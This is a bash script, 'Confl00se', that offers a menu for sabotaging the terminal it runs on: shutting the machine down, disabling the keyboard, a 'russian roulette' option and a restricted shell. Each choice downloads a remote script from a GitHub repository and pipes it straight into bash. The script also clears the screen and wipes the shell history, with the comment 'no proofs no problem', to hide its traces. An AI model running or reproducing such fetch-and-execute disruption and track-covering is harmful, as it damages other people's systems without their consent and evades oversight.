#!/bin/bash

gui() {
    banner=""" __   __        ___       __   ___
 /  \` /  \\ |\ | |__  |    /__\` |__
 \__, \__/ | \| |    |___ .__/ |___  """
    echo "$banner"
    echo "-------"
    echo -e "\033[0;31m[0]\033[0m poweroff"
    echo -e "\033[0;31m[1]\033[0m no keyboard"
    echo -e "\033[0;31m[2]\033[0m russian roulette"
    echo -e "\033[0;31m[3]\033[0m restricted shell"
    echo -e "\033[0;31m[4]\033[0m exit"
    echo "-------"
    read -p $'\033[1;35mHow do you want to confloose? \033[0m' choice
    confloose "$choice"
}

confloose() {
    if [ "$1" == "0" ] || [ "$1" == "poweroff" ] || [ "$1" == "-p" ]; then
        # poweroff
        bash <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/poweroff.sh")
    elif [ "$1" == "1" ] || [ "$1" == "shell" ] || [ "$1" == "-s" ]; then
         # no keyboard
         bash <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/nokeyboard.sh")
    elif [ "$1" == "2" ] || [ "$1" == "shell" ] || [ "$1" == "-s" ]; then
        # russian roulette
        bash <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/roulette.sh")
    elif [ "$1" == "3" ] || [ "$1" == "shell" ] || [ "$1" == "-s" ]; then
        # restricted_shell
        bash <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/restricted_shell.sh")
    elif [ "$1" == "4" ]; then
        exit
    else
        echo -e "\033[0;31mInvalid arg\033[0m"
    fi
}
printf "\033c" # clear
history -c # no proofs no problem 👀

if [ "$#" -eq 1 ]; then
    confloose "$1"
else
    gui
fi
